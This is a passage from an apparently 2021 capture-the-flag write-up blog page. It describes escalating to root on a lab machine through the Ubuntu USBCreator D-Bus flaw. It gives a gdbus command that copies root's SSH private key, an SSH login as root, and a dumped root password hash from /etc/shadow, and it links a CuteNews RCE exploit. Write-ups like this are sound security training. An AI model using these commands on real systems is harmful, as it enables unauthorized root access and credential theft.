class="SemanticString">nadav is also in the sudo group, but without a password, we cannot run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sudo -l</code></span><span class="SemanticString"> to see what we can access.</span></span></li><li id="https://www.notion.so/ac3495490c0b46d8824149558e2a651d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found privileged process </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">usb-creator-helper</code></span><span class="SemanticString"> in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ps aux</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/4b2de78f4034440caefb9c88351426a9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root 34787 0.0 0.4 235548 19848 ? Sl 02:05 0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper</span></span></span></code></pre></li><li id="https://www.notion.so/5b06d4f007d74c58bee7cd423c8799b9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This is a program called &quot;Startup Disk Creator&quot;, used to create live USBs of Ubuntu from the Live CD or ISO image, and is included by default in all releases after Ubuntu 8.04.</span></span></li><li id="https://www.notion.so/ca33b31c1ac4474fbb3c2035d2b1301c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">It seems that USBCreator uses a Python implementation of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dd</code></span><span class="SemanticString"> to write to disks.</span></span></li><li id="https://www.notion.so/f1cf1d0dba1b46d4bf13daea79ec42f7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">However, no sanitation checks are performed on the source or target path, nor does it prompt the user for passwords.</span></span></li><li id="https://www.notion.so/dfabc3310762432b907401d83e3c81d9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This means any user belonging to the sudo group can overwrite arbitrary files on the filesystem, as root.</span></span></li><li id="https://www.notion.so/5982814902574f5fa6a22cc78c4ca197" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Make a method call with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gdbus</code></span><span class="SemanticString">, to copy root&#x27;s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">id_rsa</code></span><span class="SemanticString"> to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/tmp</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/4e5b1c0125764e1e8af12a006275b635" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_id_rsa true</code></span></span></p></div></li><li id="https://www.notion.so/9f67cd4b043249faaa265f0a7467c089" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root_id_rsa</code></span><span class="SemanticString">, we can SSH in as root:</span></span><div id="https://www.notion.so/b4a0e4165e7a4a438f3403f3c86ba28c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh root@10.10.10.206 -i root_id_rsa</code></span></span></p></div><div id="https://www.notion.so/da688c27600e49628ad3f10a19e856f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ id</code></span></span></p></div><pre id="https://www.notion.so/270fe89abc02489ab447cce5d2f80f34" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre></li><li id="https://www.notion.so/6a7f3e4d3f204fbaa0f0b24c14f11538" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag.</span></span></li></ul><h2 id="https://www.notion.so/753adb46e71b49a7a626af2ab52f4fc1" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/753adb46e71b49a7a626af2ab52f4fc1"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/9b8b701033824c75bceb515e5be134c7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root hash from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/shadow</code></span><span class="SemanticString"> file:</span></span><pre id="https://www.notion.so/0866224e0b7045df9c8e1534d3b5ca54" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::</span></span></span></code></pre></li></ul><h2 id="https://www.notion.so/a03bbc580b9941e39911f0653106e052" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/a03bbc580b9941e39911f0653106e052"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/37c5c11def144752aa6fd3dbe5f14198" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://musyokaian.medium.com/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194">https://musyokaian.medium.com/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194</a></span></span></li><li id="https://www.notion.so/8c03a374ae114a62b372362c44db2e82" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/musyoka101/CuteNews_2.1.2_RCE_exploit/blob/master/exploit.py">https://github.com/musyoka101/CuteNews_2.1.2_RCE_exploit/blob/master/exploit.py</a></span></span></li><li id="https://www.notion.so/7831ce5d01494769bd2c0a932e9475c0" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a></span></span></li></ol></article>
  <footer class="Footer">
        <div>&copy; samiko@127.0.0.1~$ &centerdot; 2021</div>
        <div>&centerdot;</div>
        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
            rel="noopener noreferrer">Notablog</a>.
        </div>
    </footer>
</body>

</html>
